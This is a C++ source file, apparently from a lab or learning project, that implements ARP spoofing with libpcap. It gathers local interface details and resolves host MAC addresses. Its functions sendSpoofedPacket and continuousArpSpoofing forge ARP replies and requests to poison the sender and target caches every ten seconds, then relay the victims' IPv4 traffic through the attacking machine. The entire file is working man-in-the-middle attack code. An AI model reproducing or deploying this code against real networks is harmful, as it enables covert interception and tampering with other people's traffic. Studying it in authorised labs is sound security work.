#include "Packet.h"

#define BUF_SIZE 256

bool Packet::openLiveCapture(){
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (pcap == nullptr) {
        fprintf(stderr, "pcap_open_live(%s) return null - %s\n", dev, errbuf);
        return false;
    }
    return true;
}


bool Packet::setMyInterfaceInfo() {
    struct ifreq ifr;
    int sockfd;

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if(sockfd < 0) {
        fprintf(stderr, "Fail to get interface info - socket() failed - %m\n");
        return false;
    }

    //Set my Interface Mac
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, dev, IFNAMSIZ);
    if (ioctl(sockfd, SIOCGIFHWADDR, &ifr) < 0) {
        fprintf(stderr, "Fail to get interface MAC address - ioctl(SIOCSIFHWADDR) failed - %m\n");
        close(sockfd);
        return false;
    }
    memcpy(interfaceMac, ifr.ifr_hwaddr.sa_data, ETH_ADDR_LEN);

    //Set my Interface Ip
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, dev, IFNAMSIZ);
    if (ioctl(sockfd, SIOCGIFADDR, &ifr) < 0) {
        fprintf(stderr, "Fail to get interface IP address - ioctl(SIOCGIFADDR) failed - %m\n");
        close(sockfd);
        return false;
    }
    interfaceIp = ((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr.s_addr;

    //Set my Interface subnetMask
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, dev, IFNAMSIZ);
    if (ioctl(sockfd, SIOCGIFNETMASK, &ifr) < 0) {
        fprintf(stderr, "Fail to get interface netmask - ioctl(SIOCGIFNETMASK) failed - %m\n");
        close(sockfd);
        return false;
    }
    interfaceSubnetMask = ((struct sockaddr_in *)&ifr.ifr_netmask)->sin_addr.s_addr;

    close(sockfd);
    return true;
}


void Packet::setEthHeader(u_int8_t* srcMac, u_int8_t* dstMac, u_int16_t ethType){
    for (int i = 0; i < ETH_ADDR_LEN; i++){
        ethHeader.srcMac[i] = srcMac[i];
        ethHeader.dstMac[i] = dstMac[i];
    }
    ethHeader.ethType = htons(ethType);
}


void Packet::setArpHeader(u_int8_t* srcMac, u_int32_t srcIp, u_int8_t* dstMac, u_int32_t dstIp, u_int16_t opCode){
    for (int i = 0; i < ETH_ADDR_LEN; i++){
        arpHeader.srcMac[i] = srcMac[i];
        arpHeader.dstMac[i] = dstMac[i];
    }
    arpHeader.srcIp = srcIp;
    arpHeader.dstIp = dstIp;
    arpHeader.op = htons(opCode);
}


void Packet::sendPacket(){
    int res = 0;
    if (ethHeader.ethType == htons(ethHdr::ARP)){
        ethArpHeader.eth = ethHeader;
        ethArpHeader.arp = arpHeader;
        res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&ethArpHeader), sizeof(ethArpHdr));
    } else if (ethHeader.ethType == htons(ethHdr::IPv4)){
        ethIpv4Header.eth = ethHeader;
        ethIpv4Header.ipv4 = Ipv4Header;
        res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&ethIpv4Header), sizeof(ethIpv4Hdr));
    }

    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
    }
}


void Packet::sendPacket(const u_char* packet, u_int32_t packetLength){
    int res = pcap_sendpacket(pcap, packet, packetLength);
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
    }
}

packetInfo Packet::captureNextPacket(){
    packetInfo capturedPacketInfo;
    capturedPacketInfo.status = pcap_next_ex(pcap, &capturedPacketInfo.header, &capturedPacketInfo.packet);
    return capturedPacketInfo;
}


void Packet::resolveMacByIp(u_int32_t ip){
    //if ((interfaceIp && interfaceSubnetMask) != (ip && interfaceSubnetMask)) return;

    setEthHeader(interfaceMac, BROADCAST_MAC, ethHdr::ARP);
    setArpHeader(interfaceMac, interfaceIp, NULL_MAC, ip, arpHdr::ArpRequest);
    sendPacket();

    while (true){
        packetInfo capturedPacketInfo = captureNextPacket();
        if (capturedPacketInfo.status == 0) continue;
        if (capturedPacketInfo.status == PCAP_ERROR || capturedPacketInfo.status == PCAP_ERROR_BREAK) {
            fprintf(stderr, "pcap_next_ex return %d(%s)\n", capturedPacketInfo.status , pcap_geterr(pcap));
            break;
        }

        ethArpHdr* capturedPacket = (ethArpHdr*)(capturedPacketInfo.packet);
        if (ntohs(capturedPacket->eth.ethType) == ethHdr::ARP && capturedPacket->arp.srcIp == ip){
            for (int i = 0; i < ETH_ADDR_LEN; i++) arpTable[ip][i] = capturedPacket->eth.srcMac[i];
            break;
        }
    }
}


void Packet::resolveMacByIpforSpoof(u_int32_t senderIp, u_int32_t targetIp){
    if (arpTable.count(senderIp) == 0) resolveMacByIp(senderIp);
    if (arpTable.count(targetIp) == 0) resolveMacByIp(targetIp);

    SenderTargetPair pair;
    pair.sender.ip = senderIp;
    pair.target.ip = targetIp;
    for (int i = 0; i < ETH_ADDR_LEN; i++){
        pair.sender.mac[i] = arpTable[senderIp][i];
        pair.target.mac[i] = arpTable[targetIp][i];
    }
    senderTargetTable.push_back(pair);
}


void Packet::sendSpoofedPacket(u_int32_t senderIp, u_int32_t targetIp, u_int16_t opCode){
    setEthHeader(interfaceMac, arpTable[senderIp], ethHdr::ARP);
    setArpHeader(interfaceMac, targetIp, arpTable[senderIp], senderIp, opCode);
    sendPacket();
}


void Packet::continuousArpSpoofing(){
    time_t start_time, current_time;
    double elapsed_time;
    start_time = time(NULL);

    while(true) {    
        packetInfo capturedPacketInfo = captureNextPacket();
        if (capturedPacketInfo.status == 0) continue;
        if (capturedPacketInfo.status == PCAP_ERROR || capturedPacketInfo.status == PCAP_ERROR_BREAK) {
            fprintf(stderr, "pcap_next_ex return %d(%s)\n", capturedPacketInfo.status , pcap_geterr(pcap));
            break;
        }

        ethHdr* ethhdr = (ethHdr*)(capturedPacketInfo.packet);
        for (auto iter = senderTargetTable.begin(); iter != senderTargetTable.end(); iter++){
            current_time = time(NULL);
            elapsed_time = difftime(current_time, start_time);
            if (elapsed_time >= 10) {
                if (std::next(iter) == senderTargetTable.end()) start_time = current_time;
                sendSpoofedPacket(iter->sender.ip, iter->target.ip, arpHdr::ArpRequest);
            }

            if (ethhdr->ethType == htons(ethHdr::ARP)){
                arpHdr* arphdr = (arpHdr*)(capturedPacketInfo.packet + ETH_HDR_LEN);
                if (arphdr->srcIp == iter->sender.ip && arphdr->dstIp == iter->target.ip && arphdr->op == htons(arpHdr::ArpRequest)){
                    sendSpoofedPacket(arphdr->srcIp, arphdr->dstIp, arpHdr::ArpReply);
                    break;
                }
            } else if (ethhdr->ethType == htons(ethHdr::IPv4)){
                ipv4Hdr* ipv4hdr= (ipv4Hdr*)(capturedPacketInfo.packet + ETH_HDR_LEN);
                if (ipv4hdr->srcIp == iter->sender.ip && ipv4hdr->dstIp != interfaceIp){
                    if (arpTable.count(ipv4hdr->dstIp) == 0) resolveMacByIp(ipv4hdr->dstIp);
                    for (int i = 0; i < ETH_ADDR_LEN; i++){
                        ethhdr->srcMac[i] = interfaceMac[i];
                        ethhdr->dstMac[i] = arpTable[ipv4hdr->dstIp][i];
                    }
                    sendPacket(capturedPacketInfo.packet, capturedPacketInfo.header->len);
                    break;
                }
            }
        }
    }
}





